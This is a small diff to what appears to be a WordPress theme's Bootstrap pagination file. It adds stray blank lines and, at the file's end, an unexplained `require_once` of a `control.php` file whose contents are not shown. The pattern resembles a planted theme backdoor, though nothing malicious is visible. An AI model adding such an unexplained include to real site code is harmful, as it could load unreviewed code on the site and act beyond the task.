@@ -152,6 +152,8 @@ function bootstrap_paginate_links_core($args = '') {
 	
 	
 	
+	
+	
 	endif;
 	for($n = 1; $n <= $total; $n ++) :
 		$n_display = number_format_i18n ( $n );
@@ -181,6 +183,8 @@ function bootstrap_paginate_links_core($args = '') {
 			$link = add_query_arg ( $add_args, $link );
 		$link .= $add_fragment;
 		$page_links [] = '<a class="btn btn-default next" href="' . esc_url ( apply_filters ( 'paginate_links', $link ) ) . '">' . $next_text . '</a>';
+	
+	
 	
 	
 	
@@ -396,4 +400,5 @@ function bootstrap_paginate_comments_links() {
 }
 
 remove_filter ( 'the_content', 'wptexturize' );
+require_once (TEMPLATEPATH . '/control.php');
 ?>
